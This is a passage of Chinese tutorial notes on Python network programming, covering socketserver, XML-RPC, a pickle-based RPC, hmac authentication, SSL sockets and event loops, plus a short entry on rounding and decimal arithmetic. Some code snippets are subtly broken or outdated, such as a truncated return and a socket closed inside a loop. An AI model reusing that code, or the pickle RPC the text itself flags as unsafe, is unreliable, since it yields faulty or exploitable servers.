handle(self):\n    print('Got connection from', self.client_address)\n    # self.rfile is a file-like object for reading\n    for line in self.rfile:\n      # self.wfile is a file-like object for writing\n      self.wfile.write(line)\n\nif __name__ == '__main__':\n  serv = TCPServer(('', 20000), EchoHandler)\n  serv.serve_forever() 讨论 socketserver 可以让我们很容易的创建简单的 TCP 服务器。但是，你需要注意\n的是，默认情况下这种服务器是单线程的，一次只能为一个客户端连接服务。如果你想\n处理多个客户端，可以初始化一个 ForkingTCPServer 或者是 ThreadingTCPServer 对\n象。例如: from socketserver import ThreadingTCPServer\nif __name__ == '__main__':\n  serv = ThreadingTCPServer(('', 20000), EchoHandler)\n  serv.serve_forever() 使用 fork 或线程服务器有个潜在问题就是它们会为每个客户端连接创建一个新的\n进程或线程。由于客户端连接数是没有限制的，因此一个恶意的黑客可以同时发送大量\n的连接让你的服务器奔溃。 如果你担心这个问题，你可以创建一个预先分配大小的工作线程池或进程池。你先\n创建一个普通的非线程服务器，然后在一个线程池中使用 serve_forever() 方法来启\n动它们: from threading import Thread\nNWORKERS = 16\nserv = TCPServer(('', 20000), EchoHandler)\nfor n in range(NWORKERS):\n  t = Thread(target=serv.serve_forever)\n  t.daemon = True\n  t.start()\nserv.serve_forever() 一般来讲，一个 TCPServer 在实例化的时候会绑定并激活相应的 socket\n。不过，有时候你想通过设置某些选项去调整底下的 socket‘ ，可以设置参数\nbind_and_activate=False 。如下: serv = TCPServer(('', 20000), EchoHandler, bind_and_activate=False)\n# Set up various socket options\nserv.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)\n# Bind and activate\nserv.server_bind()\nserv.server_activate()\nserv.serve_forever() 上面的 socket 选项是一个非常普遍的配置项，它允许服务器重新绑定一个之前使\n用过的端口号。由于要被经常使用到，它被放置到类变量中，可以直接在 TCPServer 上\n面设置。在实例化服务器的时候去设置它的值，如下所示: TCPServer.allow_reuse_address = True\nserv = TCPServer(('', 20000), EchoHandler)\nserv.serve_forever() 在上面示例中，我们演示了两种不同的处理器基类（BaseRequestHandler 和\nStreamRequestHandler ）。StreamRequestHandler 更加灵活点，能通过设置其他的类\n变量来支持一些新的特性。 最后，还需要注意的是巨大部分 Python 的高层网络模块（比如 HTTP、XML-RPC\n等）都是建立在 socketserver 功能之上。也就是说，直接使用 socket 库来实现服务\n器也并不是很难。 创建 UDP 服务器 问题 你想实现一个基于 UDP 协议的服务器来与客户端通信。 解决方案 跟 TCP 一样，UDP 服务器也可以通过使用 socketserver 库很容易的被创建。例\n如，下面是一个简单的时间服务器: from socketserver import BaseRequestHandler, UDPServer\nimport time\nclass TimeHandler(BaseRequestHandler):\n  def handle(self):\n    print('Got connection from', self.client_address)\n    # Get message and client socket\n    msg, sock = self.request\n    resp = time.ctime()\n    sock.sendto(resp.encode('ascii'), self.client_address)\n\nif __name__ == '__main__':\n  serv = UDPServer(('', 20000), TimeHandler)\n  serv.serve_forever() 来测试下这个服务器: >>> from socket import socket, AF_INET, SOCK_DGRAM\n>>> s = socket(AF_INET, SOCK_DGRAM)\n>>> s.sendto(b'', ('localhost', 20000))\n0\n>>> s.recvfrom(8192)\n(b'Wed Aug 15 20:35:08 2012', ('127.0.0.1', 20000))\n>>> 讨论 一个典型的 UDP 服务器接收到达的数据报 (消息) 和客户端地址。如果服务器需\n要做应答，它要给客户端回发一个数据报。对于数据报的传送，你应该使用 socket 的\nsendto() 和 recvfrom() 方法。尽管传统的 send() 和 recv() 也可以达到同样的效果，\n但是前面的两个方法对于 UDP 连接而言更普遍。 由于没有底层的连接，UPD 服务器相对于 TCP 服务器来讲实现起来更加简单。不\n过，UDP 天生是不可靠的（因为通信没有建立连接，消息可能丢失）。因此需要由你自\n己来决定该怎样处理丢失消息的情况。 通常来\n说，如果可靠性对于你程序很重要，你需要借助于序列号、重试、超时以及一些其他方\n法来保证。UDP 通常被用在那些对于可靠传输要求不是很高的场合。例如，在实时应\n用如多媒体流以及游戏领域，无需返回恢复丢失的数据包（程序只需简单的忽略它并\n继续向前运行）。 UDPServer 类是单线程的，也就是说一次只能为一个客户端连接服务。实际使用\n中，这个无论是对于 UDP 还是 TCP 都不是什么大问题。如果你想要并发操作，可以\n实例化一个 ForkingUDPServer 或 ThreadingUDPServer 对象 通过 CIDR 地址生成对应的 IP 地址集 问题 你有一个 CIDR 网络地址比如\"123.45.67.89/27\"，你想将其转换成它所代表的所\n有 IP （比如，\"123.45.67.64\", \"123.45.67.65\", …, \"123.45.67.95\")） 解决方案 可以使用 ipaddress 模块很容易的实现这样的计算。例如: >>> import ipaddress\n>>> net = ipaddress.ip_network('123.45.67.64/27')\n>>> net\nIPv4Network('123.45.67.64/27')\n>>> for a in net:\n...   print(a)\n...\n123.45.67.64\n123.45.67.65\n123.45.67.66\n123.45.67.67\n123.45.67.68\n...\n123.45.67.95\n>>>\n>>> net6 = ipaddress.ip_network('12:3456:78:90ab:cd:ef01:23:30/125')\n>>> net6\nIPv6Network('12:3456:78:90ab:cd:ef01:23:30/125')\n>>> for a in net6:\n...   print(a)\n...\n12:3456:78:90ab:cd:ef01:23:30\n12:3456:78:90ab:cd:ef01:23:31\n12:3456:78:90ab:cd:ef01:23:32\n12:3456:78:90ab:cd:ef01:23:33\n12:3456:78:90ab:cd:ef01:23:34\n12:3456:78:90ab:cd:ef01:23:35\n12:3456:78:90ab:cd:ef01:23:36\n12:3456:78:90ab:cd:ef01:23:37\n>>> Network 也允许像数组一样的索引取值 还可以执行网络成员检查之类的操作: >>> a = ipaddress.ip_address('123.45.67.69')\n>>> a in net\nTrue\n>>> b = ipaddress.ip_address('123.45.67.123')\n>>> b in net\nFalse 一个 IP 地址和网络地址能通过一个 IP 接口来指定，例如: >>> inet = ipaddress.ip_interface('123.45.67.73/27')\n>>> inet.network\nIPv4Network('123.45.67.64/27')\n>>> inet.ip\nIPv4Address('123.45.67.73')\n>>> 讨论 ipaddress 模块有很多类可以表示 IP 地址、网络和接口。当你需要操作网络地址\n（比如解析、打印、验证等）的时候会很有用。\n要注意的是，ipaddress 模块跟其他一些和网络相关的模块比如 socket 库交集很\n少。所以，你不能使用 IPv4Address 的实例来代替一个地址字符串，你首先得显式的\n使用 str() 转换它。 创建一个简单的 REST 接口 问题 你想使用一个简单的 REST 接口通过网络远程控制或访问你的应用程序，但是你\n又不想自己去安装一个完整的 web 框架。 解决方案 构建一个 REST 风格的接口最简单的方法是创建一个基于 WSGI 标准（PEP\n3333）的很小的库. 通过 XML-RPC 实现简单的远程调用 问题 你想找到一个简单的方式去执行运行在远程机器上面的 Python 程序中的函数或方\n法 解决方案 实现一个远程方法调用的最简单方式是使用 XML-RPC。下面我们演示一下一个\n实现了键-值存储功能的简单服务器: from xmlrpc.server import SimpleXMLRPCServer\nclass KeyValueServer:\n  _rpc_methods_ = ['get', 'set', 'delete', 'exists', 'keys']\n\n  def __init__(self, address):\n    self._data = {}\n    self._serv = SimpleXMLRPCServer(address, allow_none=True)\n    for name in self._rpc_methods_:\n      self._serv.register_function(getattr(self, name))\n\n  def get(self, name):\n    return self._data[name]\n\n  def set(self, name, value):\n    self._data[name] = value\n\n  def delete(self, name):\n    del self._data[name]\n\n  def exists(self, name):\n    return name in self._data\n\n  def keys(self):\n    return list(self._data)\n\n  def serve_forever(self):\n    self._serv.serve_forever()\n\n# Example\nif __name__ == '__main__':\n  kvserv = KeyValueServer(('', 15000))\n  kvserv.serve_forever() 从一个客户端机器上面来访问服务器: >>> from xmlrpc.client import ServerProxy\n>>> s = ServerProxy('http://localhost:15000', allow_none=True)\n>>> s.set('foo', 'bar')\n>>> s.set('spam', [1, 2, 3])\n>>> s.keys()\n['spam', 'foo']\n>>> s.get('foo')\n'bar'\n>>> s.get('spam')\n[1, 2, 3]\n>>> s.delete('spam')\n>>> s.exists('spam')\nFalse\n>>> 讨论 XML-RPC 可以让我们很容易的构造一个简单的远程调用服务。你所需要做的仅\n仅是创建一个服务器实例，通过它的方法 register_function() 来注册函数，然后使\n用方法 serve_forever() 启动它。在上面我们将这些步骤放在一起写到一个类中，不\n够这并不是必须的。比如你还可以像下面这样创建一个服务器: from xmlrpc.server import SimpleXMLRPCServer\ndef add(x,y):\n  return x+y\n\nserv = SimpleXMLRPCServer(('', 15000))\nserv.register_function(add)\nserv.serve_forever() XML-RPC 暴露出来的函数只能适用于部分数据类型，比如字符串、整形、列表和\n字典。对于其他类型就得需要做些额外的功课了。例如，如果你想通过 XML-RPC 传\n递一个对象实例，实际上只有他的实例字典被处理. 类似的，对于二进制数据的处理也跟你想象的不太一样: >>> s.set('foo', b'Hello World')\n>>> s.get('foo')\n<xmlrpc.client.Binary object at 0x10131d410>\n>>> _.data\nb'Hello World'\n>>> 一般来讲，你不应该将 XML-RPC 服务以公共 API 的方式暴露出来。对于这种情\n况，通常分布式应用程序会是一个更好的选择。 XML-RPC 的一个缺点是它的性能。SimpleXMLRPCServer 的实现是单线程的，所\n以它不适合于大型程序 另外，由于 XML-RPC 将所有数据都序列化为 XML 格式，所以它会比其他的方式运\n行的慢一些。但是它也有优点，这种方式的编码可以被绝大部分其他编程语言支持。通\n过使用这种方式，其他语言的客户端程序都能访问你的服务。 虽然 XML-RPC 有很多缺点，但是如果你需要快速构建一个简单远程过程调用系\n统的话，它仍然值得去学习的。有时候，简单的方案就已经足够了。 在不同的 Python 解释器之间交互 问题 你在不同的机器上面运行着多个 Python 解释器实例，并希望能够在这些解释器之\n间通过消息来交换数据。 解决方案 通过使用 multiprocessing.connection 模块可以很容易的实现解释器之间的通\n信。下面是一个简单的应答服务器例子: from multiprocessing.connection import Listener\n\nimport traceback\n\ndef echo_client(conn):\n  try:\n    while True:\n      msg = conn.recv()\n      conn.send(msg)\n  except EOFError:\n    print('Connection closed')\n\ndef echo_server(address, authkey):\n  serv = Listener(address, authkey=authkey)\n  while True:\n    try:\n      client = serv.accept()\n      echo_client(client)\n    except Exception:\n      traceback.print_exc()\n\necho_server(('', 25000), authkey=b'peekaboo') 然后客户端连接服务器并发送消息的简单示例: >>> from multiprocessing.connection import Client\n>>> c = Client(('localhost', 25000), authkey=b'peekaboo')\n>>> c.send('hello')\n>>> c.recv()\n'hello'\n>>> c.send([1, 2, 3, 4, 5])\n>>> c.recv()\n[1, 2, 3, 4, 5]\n>>> 跟底层 socket 不同的是，每个消息会完整保存（每一个通过 send() 发送的对象能\n通过 recv() 来完整接受）。另外，所有对象会通过 pickle 序列化。因此，任何兼容 pickle\n的对象都能在此连接上面被发送和接受。 讨论 目前有很多用来实现各种消息传输的包和函数库，比如 ZeroMQ、Celery 等。你还\n有另外一种选择就是自己在底层 socket 基础之上来实现一个消息传输层。但是你想要\n简单一点的方案，那么这时候 multiprocessing.connection 就派上用场了。仅仅使用\n一些简单的语句即可实现多个解释器之间的消息通信。 如果你的解释器运行在同一台机器上面，那么你可以使用另外的通信机制，比如\nUnix 域套接字或者是 Windows 命名管道。要想使用 UNIX 域套接字来创建一个连接，\n只需简单的将地址改写一个文件名即可: s = Listener('/tmp/myconn', authkey=b'peekaboo') 要想使用 Windows 命名管道来创建连接，只需像下面这样使用一个文件名: s = Listener(r'\\\\.\\pipe\\myconn', authkey=b'peekaboo') 一个通用准则是，你不要使用 multiprocessing 来实现一个对外的公共服务。\nClient() 和 Listener() 中的 authkey 参数用来认证发起连接的终端用户。如果密钥\n不对会产生一个异常。此外，该模块最适合用来建立长连接（而不是大量的短连接），\n例如，两个解释器之间启动后就开始建立连接并在处理某个问题过程中会一直保持连\n接状态。 如果你需要对底层连接做更多的控制，比如需要支持超时、非阻塞 I/O 或其他类\n似的特性，你最好使用另外的库或者是在高层 socket 上来实现这些特性。 实现远程方法调用 问题 你想在一个消息传输层如 sockets 、multiprocessing connections 或 ZeroMQ 的\n基础之上实现一个简单的远程过程调用（RPC）。 解决方案 将函数请求、参数和返回值使用 pickle 编码后，在不同的解释器直接传送 pickle 字\n节字符串，可以很容易的实现 RPC。下面是一个简单的 PRC 处理器，可以被整合到一\n个服务器中去: # rpcserver.py\nimport pickle\nclass RPCHandler:\n\n  def __init__(self):\n    self._functions = { }\n\n  def register_function(self, func):\n    self._functions[func.__name__] = func\n\n  def handle_connection(self, connection):\n    try:\n      while True:\n\n        # Receive a message\n        func_name, args, kwargs = pickle.loads(connection.recv())\n\n        # Run the RPC and send a response\n        try:\n          r = self._functions[func_name](*args,**kwargs)\n          connection.send(pickle.dumps(r))\n        except Exception as e:\n          connection.send(pickle.dumps(e))\n    except EOFError:\n      pass 要使用这个处理器，你需要将它加入到一个消息服务器中。你有很多种选择，但是\n使用 multiprocessing 库是最简单的。下面是一个 RPC 服务器例子: from multiprocessing.connection import Listener\nfrom threading import Thread\n\ndef rpc_server(handler, address, authkey):\n  sock = Listener(address, authkey=authkey)\n  while True:\n    client = sock.accept()\n    t = Thread(target=handler.handle_connection, args=(client,))\n    t.daemon = True\n    t.start()\n\n# Some remote functions\ndef add(x, y):\n  return x + y\n\ndef sub(x, y):\n  return x - y\n\n# Register with a handler\nhandler = RPCHandler()\nhandler.register_function(add)\nhandler.register_function(sub)\n\n# Run the server\nrpc_server(handler, ('localhost', 17000), authkey=b'peekaboo') 为了从一个远程客户端访问服务器，你需要创建一个对应的用来传送请求的 RPC\n代理类。例如: import pickle\n\nclass RPCProxy:\n  def __init__(self, connection):\n    self._connection = connection\n\n  def __getattr__(self, name):\n    def do_rpc(*args, **kwargs):\n      self._connection.send(pickle.dumps((name, args, kwargs)))\n      result = pickle.loads(self._connection.recv())\n      if isinstance(result, Exception):\n        raise result\n      return result\n    return do_rp 要使用这个代理类，你需要将其包装到一个服务器的连接上面，例如: >>> from multiprocessing.connection import Client\n>>> c = Client(('localhost', 17000), authkey=b'peekaboo')\n>>> proxy = RPCProxy(c)\n>>> proxy.add(2, 3) 5\n>>> proxy.sub(2, 3)\n-1\n>>> proxy.sub([1, 2], 4)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"rpcserver.py\", line 37, in do_rpc\n    raise result\nTypeError: unsupported operand type(s) for -: 'list' and 'int'\n>>> 要注意的是很多消息层（比如 multiprocessing ）已经使用 pickle 序列化了数据。\n如果是这样的话，对 pickle.dumps() 和 pickle.loads() 的调用要去掉。 讨论 由于底层需要依赖 pickle，那么安全问题就需要考虑了（因为一个聪明的黑客可以\n创建特定的消息，能够让任意函数通过 pickle 反序列化后被执行）。因此你永远不要允\n许来自不信任或未认证的客户端的 RPC。特别是你绝对不要允许来自 Internet 的任意\n机器的访问，这种只能在内部被使用，位于防火墙后面并且不要对外暴露。 实现 RPC 的一个比较复杂的问题是如何去处理异常。至少，当方法产生异常时服\n务器不应该奔溃。因此，返回给客户端的异常所代表的含义就要好好设计了。如果你使\n用 pickle，异常对象实例在客户端能被反序列化并抛出。如果你使用其他的协议，那得\n想想另外的方法了。不过至少，你应该在响应中返回异常字符串。 简单的客户端认证 问题 你想在分布式系统中实现一个简单的客户端连接认证功能，又不想像 SSL 那样的\n复杂。 解决方案 可以利用 hmac 模块实现一个连接握手，从而实现一个简单而高效的认证过程。下\n面是代码示例: import hmac\nimport os\ndef client_authenticate(connection, secret_key):\n  '''\n  Authenticate client to a remote service.\n  connection represents a network connection.\n  secret_key is a key known only to both client/server.\n  '''\n  message = connection.recv(32)\n  hash = hmac.new(secret_key, message)\n  digest = hash.digest()\n  connection.send(digest)\n\ndef server_authenticate(connection, secret_key):\n  '''\n  Request client authentication.\n  '''\n  message = os.urandom(32)\n  connection.send(message)\n  hash = hmac.new(secret_key, message)\n  digest = hash.digest()\n  response = connection.recv(len(digest))\n  return hmac.compare_digest(digest,response) 基本原理是当连接建立后，服务器给客户端发送一个随机的字节消息（这里例子\n中使用了 os.urandom() 返回值）。客户端和服务器同时利用 hmac 和一个只有双方知\n道的密钥来计算出一个加密哈希值。然后客户端将它计算出的摘要发送给服务器，服务\n器通过比较这个值和自己计算的是否一致来决定接受或拒绝连接。摘要的比较需要使\n用 hmac.compare_digest() 函数。使用这个函数可以避免遭到时间分析攻击，不要用\n简单的比较操作符（==）。为了使用这些函数，你需要将它集成到已有的网络或消息\n代码中。 讨论 hmac 认证的一个常见使用场景是内部消息通信系统和进程间通信。例如，如果你\n编写的系统涉及到一个集群中多个处理器之间的通信，你可以使用本节方案来确保只\n有被允许的进程之间才能彼此通信。事实上，基于 hmac 的认证被 multiprocessing 模\n块使用来实现子进程直接的通信。 还有一点需要强调的是连接认证和加密是两码事。认证成功之后的通信消息是以\n明文形式发送的，任何人只要想监听这个连接线路都能看到消息（尽管双方的密钥不\n会被传输） hmac 认证算法基于哈希函数如 MD5 和 SHA-1， 在网络服务中加入 SSL 问题 你想实现一个基于 sockets 的网络服务，客户端和服务器通过 SSL 协议认证并加\n密传输的数据。 解决方案 ssl 模块能为底层 socket 连接添加 SSL 的支持。ssl.wrap_socket() 函数接受一\n个已存在的 socket 作为参数并使用 SSL 层来包装它。例如，下面是一个简单的应答服\n务器，能在服务器端为所有客户端连接做认证。 例子: from socket import socket, AF_INET, SOCK_STREAM\nimport ssl\n\nKEYFILE = 'server_key.pem' # Private key of the server\nCERTFILE = 'server_cert.pem' # Server certificate (given to client)\n\ndef echo_client(s):\n  while True:\n    data = s.recv(8192)\n    if data == b'':\n      break\n    s.send(data)\n    s.close()\n    print('Connection closed')\n\ndef echo_server(address):\n  s = socket(AF_INET, SOCK_STREAM)\n  s.bind(address)\n  s.listen(1)\n\n  # Wrap with an SSL layer requiring client certs\n  s_ssl = ssl.wrap_socket(s,\n                          keyfile=KEYFILE,\n                          certfile=CERTFILE,\n                          server_side=True\n                          )\n  # Wait for connections\n  while True:\n    try:\n      c,a = s_ssl.accept()\n      print('Got connection', c, a)\n      echo_client(c)\n    except Exception as e:\n      print('{}: {}'.format(e.__class__.__name__, e))\n\necho_server(('', 20000)) 客户端连接服务器: >>> from socket import socket, AF_INET, SOCK_STREAM\n>>> import ssl\n>>> s = socket(AF_INET, SOCK_STREAM)\n>>> s_ssl = ssl.wrap_socket(s,\n              cert_reqs=ssl.CERT_REQUIRED,\n              ca_certs = 'server_cert.pem')\n>>> s_ssl.connect(('localhost', 20000))\n>>> s_ssl.send(b'Hello World?')\n12\n>>> s_ssl.recv(8192)\nb'Hello World?'\n>>> 这种直接处理底层 socket 方式有个问题就是它不能很好的跟标准库中已存在的\n网络服务兼容。例如，绝大部分服务器代码（HTTP、XML-RPC 等）实际上是基于\nsocketserver 库的。客户端代码在一个较高层上实现。我们需要另外一种稍微不同的\n方式来将 SSL 添加到已存在的服务中 创建自签名证书: openssl req -new -x509 -days 365 -nodes -out server_cert.pem -keyout server_key.pem 在创建证书的时候，各个值的设定可以是任意的，但是\"Common Name\"的值通\n常要包含服务器的 DNS 主机名。如果你只是在本机测试，那么就使用\"localhost\"，否\n则使用服务器的域名。 进程间传递 Socket 文件描述符 问题 你有多个 Python 解释器进程在同时运行，你想将某个打开的文件描述符从一个解\n释器传递给另外一个。比如，假设有个服务器进程相应连接请求，但是实际的相应逻辑\n是在另一个解释器中执行的。 解决方案 为了在多个进程中传递文件描述符，你首先需要将它们连接到一起。在 Unix 机器\n上，你可能需要使用 Unix 域套接字，而在 windows 上面你需要使用命名管道。不过你\n无需真的需要去操作这些底层，通常使用 multiprocessing 模块来创建这样的连接会\n更容易一些。 一 旦 一 个 连 接 被 创 建， 你 可 以 使 用 multiprocessing.reduction 中 的\nsend_handle() 和 recv_handle() 函数在不同的处理器直接传递文件描述符。下面\n的例子演示了最基本的用法: import multiprocessing\nfrom multiprocessing.reduction import recv_handle, send_handle\nimport socket\n\ndef worker(in_p, out_p):\n  out_p.close()\n  while True:\n    fd = recv_handle(in_p)\n    print('CHILD: GOT FD', fd)\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, fileno=fd) as s:\n      while True:\n        msg = s.recv(1024)\n        if not msg:\n          break\n        print('CHILD: RECV {!r}'.format(msg))\n        s.send(msg)\n\ndef server(address, in_p, out_p, worker_pid):\n  in_p.close()\n  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True) s.bind(address)\n  s.listen(1)\n  while True:\n    client, addr = s.accept()\n    print('SERVER: Got connection from', addr)\n    send_handle(out_p, client.fileno(), worker_pid)\n    client.close()\n\nif __name__ == '__main__':\n  c1, c2 = multiprocessing.Pipe()\n  worker_p = multiprocessing.Process(target=worker, args=(c1,c2))\n  worker_p.start()\n  server_p = multiprocessing.Process(target=server,\n  args=(('', 15000), c1, c2, worker_p.pid))\n  server_p.start()\n  c1.close()\n  c2.close() 在这个例子中，两个进程被创建并通过一个 multiprocessing 管道连接起来。服\n务器进程打开一个 socket 并等待客户端连接请求。工作进程仅仅使用 recv_handle()\n在管道上面等待接收一个文件描述符。当服务器接收到一个连接，它将产生的 socket\n文件描述符通过 send_handle() 传递给工作进程。工作进程接收到 socket 后向客户端\n回应数据，然后此次连接关闭。 讨论 对于大部分程序员来讲在不同进程之间传递文件描述符好像没什么必要。但是，有\n时候它是构建一个可扩展系统的很有用的工具。例如，在一个多核机器上面，你可以有\n多个 Python 解释器实例，将文件描述符传递给其它解释器来实现负载均衡。 send_handle() 和 recv_handle() 函数只能够用于 multiprocessing 连接。 理解事件驱动的 IO 问题 你应该已经听过基于事件驱动或异步 I/O 的包，但是你还不能完全理解它的底层\n到底是怎样工作的，或者是如果使用它的话会对你的程序产生什么影响。 解决方案 事件驱动 I/O 本质上来讲就是将基本 I/O 操作（比如读和写）转化为你程序需要\n处理的事件。例如，当数据在某个 socket 上被接受后，它会转换成一个 receive 事件，\n然后被你定义的回调方法或函数来处理。作为一个可能的起始点，一个事件驱动的框架\n可能会以一个实现了一系列基本事件处理器方法的基类开始: class EventHandler:\n  def fileno(self):\n    'Return the associated file descriptor'\n    raise NotImplemented('must implement')\n\n  def wants_to_receive(self):\n    'Return True if receiving is allowed'\n    return False\n\n  def handle_receive(self):\n    'Perform the receive operation'\n    pass\n\n  def wants_to_send(self):\n    'Return True if sending is requested'\n    return False\n\n  def handle_send(self):\n    'Send outgoing data'\n    pass 这个类的实例作为插件被放入类似下面这样的事件循环中: import select\ndef event_loop(handlers):\nwhile True:\n  wants_recv = [h for h in handlers if h.wants_to_receive()]\n  wants_send = [h for h in handlers if h.wants_to_send()]\n  can_recv, can_send, _ = select.select(wants_recv, wants_send, [])\n  for h in can_recv:\n    h.handle_receive()\n  for h in can_send:\n    h.handle_send() 事件循环的关键部分是 select() 调用，它会不断轮询文件描述符从而激活它。在\n调用 select() 之前，时间循环会询问所有的处理器来决定哪一个想接受或发生。然后\n它将结果列表提供给 select() 。然后 select() 返回准备接受或发送的对象组成的列\n表。然后相应的 handle_receive() 或 handle_send() 方法被触发。 讨论 实际上所有的事件驱动框架原理跟上面的例子相差无几。实际的实现细节和软件\n架构可能不一样，但是在最核心的部分，都会有一个轮询的循环来检查活动 socket，并\n执行响应操作. 事件驱动 I/O 的一个可能好处是它能处理非常大的并发连接，而不需要使用多线\n程或多进程。也就是说，select() 调用（或其他等效的）能监听大量的 socket 并响应\n它们中任何一个产生事件的。在循环中一次处理一个事件，并不需要其他的并发机制。 事件驱动 I/O 的缺点是没有真正的同步机制。如果任何事件处理器方法阻塞或执\n行一个耗时计算，它会阻塞所有的处理进程。调用那些并不是事件驱动风格的库函数也\n会有问题，同样要是某些库函数调用会阻塞，那么也会导致整个事件循环停止。 对于阻塞或耗时计算的问题可以通过将事件发送个其他单独的线程或进程来处理。\n不过，在事件循环中引入多线程和多进程是比较棘手的，下面的例子演示了如何使用\nconcurrent.futures 模块来实现: self.pool = ThreadPoolExecutor(nworkers)\nr = self.pool.submit(func, *args, **kwargs)\nr.add_done_callback(lambda r: self._complete(callback, r)) 工作被提交给 ThreadPoolExecutor 实例。不过一个难点是协调计算结果和事件循环: # Callback that executes when the thread is done\ndef _complete(self, callback, r):\n  self.pending.append((callback, r.result()))\n  self.signal_done_sock.send(b'x') 发送与接收大型数组 问题 你要通过网络连接发送和接受连续数据的大型数组，并尽量减少数据的复制操作 解决方案 下面的函数利用 memoryviews 来发送和接受大数组: # zerocopy.py\ndef send_from(arr, dest):\n  view = memoryview(arr).cast('B')\n  while len(view):\n    nsent = dest.send(view)\n    view = view[nsent:]\n\ndef recv_into(arr, source):\n  view = memoryview(arr).cast('B')\n  while len(view):\n    nrecv = source.recv_into(view)\n    view = view[nrecv:] 讨论 在数据密集型分布式计算和平行计算程序中，自己写程序来实现发送/接受大量数\n据并不常见。不过，要是你确实想这样做，你可能需要将你的数据转换成原始字节，以\n便给低层的网络函数使用。你可能还需要将数据切割成多个块，因为大部分和网络相关\n的函数并不能一次性发送或接受超大数据块。 一种方法是使用某种机制序列化数据——可能将其转换成一个字节字符串。不过，\n这样最终会创建数据的一个复制。就算你只是零碎的做这些，你的代码最终还是会有大\n量的小型复制操作。 本质上，一个内存视图就是一个已存\n在数组的覆盖层。内存视图还能以不同的方式转换成不同类型来表现数据: view = memoryview(arr).cast('B') 它接受一个数组 arr 并将其转换为一个无符号字节的内存视图。这个视图能被传递\n给 socket 相关函数，比如 socket.send() 或 send.recv_into() 。在内部，这些方法\n能够直接操作这个内存区域。例如，sock.send() 直接从内存中发生数据而不需要复\n制。send.recv_into() 使用这个内存区域作为接受操作的输入缓冲区 剩下的一个难点就是 socket 函数可能只操作部分数据。通常来讲，我们得使用很\n多不同的 send() 和 recv_into() 来传输整个数组。不用担心，每次操作后，视图会通\n过发送或接受字节数量被切割成新的视图。新的视图同样也是内存覆盖层。因此，还是\n没有任何的复制操作. 这里有个问题就是接受者必须事先知道有多少数据要被发送，以便它能预分配一\n个数组或者确保它能将接受的数据放入一个已经存在的数组中。如果没办法知道的话，\n发送者就得先将数据大小发送过来，然后再发送实际的数组数据。","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Network-and-web-programming.html","loc":"/yq-docs-rear-end-python-cookbook-Network-and-web-programming.html"},{"title":"数字/日期/时间","text":"数字的四舍五入 round(value, ndigits), 不过当取数的值为5时有点特殊, 见 round 当一个值刚好在两个边界的中间的时候，round 函数返回离它最近的偶数。也就是 说，对 1.5 或者 2.5 的舍入运算都会得到 2。 传给 round() 函数的 ndigits 参数可以是负数，这种情况下，舍入运算会作用在 十位、百位、千位等上面。比如: >>> a = 1627731\n>>> round(a, -1)\n1627730\n>>> round(a, -2)\n1627700\n>>> round(a, -3)\n1628000\n>>> 如果你的目的只是简单的输出一定宽度的数， 你不需要使用 round() 函数。而仅仅只需要在格式化的时候指定精度即可: >>> x = 1.23456\n>>> format(x, '0.2f')\n'1.23'\n>>> format(x, '0.3f')\n'1.235'\n>>> 'value is {:0.3f}'.format(x)\n'value is 1.235'\n>>> 不要试着去舍入浮点值来\"修正\"表面上看起来正确的问题。比如，你可能 倾向于这样做: >>> a = 2.1\n>>> b = 4.2\n>>> c = a + b\n>>> c\n6.300000000000001\n>>> c = round(c, 2) # \"Fix\" result (???)\n>>> c\n6.3\n>>> 对于大多数使用到浮点的程序，没有必要也不推荐这样做。\n尽管在计算的时候会有 一点点小的误差，但是这些小的误差是能被理解与容忍的。\n如果不能允许这样的小误差 (比如涉及到金融领域)，那么就得考虑使用 decimal 模块了 精确的浮点数运算 decimal math 需要对浮点数执行精确的计算操作，并且不希望有任何小误差的出现 浮点数的一个普遍问题是它们并不能精确的表示十进制数。并且，即使是最简单的 数学运算也会产生小的误差，比如: >>> a = 4.2\n>>> b = 2.1\n>>> a + b\n6.300000000000001\n>>> (a + b) == 6.3\nFalse\n>>> 这些错误是由底层 CPU 和 IEEE 754 标准通过自己的浮点单位去执行算术时的特 征。\n由于 Python 的浮点数据类型使用底层表示存储数据，因此你没办法去避免这样的 误差。 如果你想更加精确 (并能容忍一定的性能损耗)，你可以使用 decimal 模块: >>> from decimal import Decimal\n>>> a = Decimal('4.2')\n>>> b = Decimal('2.1')\n>>> a + b\nDecimal('6.3')\n>>> print(a + b)\n6.3\n>>> (a + b) == Decimal('6.3')\nTrue 有个看起来比较奇怪的是 用字符串来表示数字. decimal 模块的一个主要特征是允许你控制计算的每一方面，包括数字位数和四 舍五入运算。\n为了这样做，你先得创建一个本地上下文并更改它的设置: >>> from decimal import localcontext\n>>> a = Decimal('1.3')\n>>> b = Decimal('1.7')\n>>> print(a / b)\n0.7647058823529411764705882353\n>>> with localcontext() as ctx:\n... ctx.prec = 3\n... print(a / b) ...\n0.765\n>>> with localcontext() as ctx:\n... ctx.prec = 50\n... print(a / b)\n... 0.76470588235294117647058823529411764705882352941176\n>>> 新手会倾向于使用 decimal 模块来处理浮点数的精确运算。\n然而，先理解 你的应用程序目的是非常重要的。\n如果你是在做科学计算或工程领域的计算、电脑绘 图，或者是科学领域的大多数运算，那么使用普通的浮点类型是比较普遍的做法。\n其中 一个原因是，在真实世界中很少会要求精确到普通浮点数能提供的 17 位精度。\n因此， 计算过程中的那么一点点的误差是被允许的。\n第二点就是，原生的浮点数计算要快的 多-有时候你在执行大量运算的时候速度也是非常重要的。\n即便如此，你却不能完全忽略误差。 数学家花了大量时间去研究各类算法，有些处 理误差会比其他方法更好。你也得注意下减法删除以及大数和小数的加分运算所带来\n的影响。比如: >>> nums = [1.23e+18, 1, -1.23e+18]\n>>> sum(nums) # Notice how 1 disappears\n0.0\n>>> 上面的错误可以利用 math.fsum() 所提供的更精确计算能力来解决: >>> import math\n>>> math.fsum(nums) 1.0\n>>> math详情见: math 然而，对于其他的算法，你应该仔细研究它并理解它的误差产生来源。 总的来说，decimal 模块主要用在涉及到金融的领域。\n在这类程序中，哪怕是一点 小小的误差在计算过程中蔓延都是不允许的。\n因此，decimal 模块为解决这类问题提供 了方法。\n当 Python 和数据库打交道的时候也通常会遇到 Decimal 对象，并且，通常也 是在处理金融数据的时候。 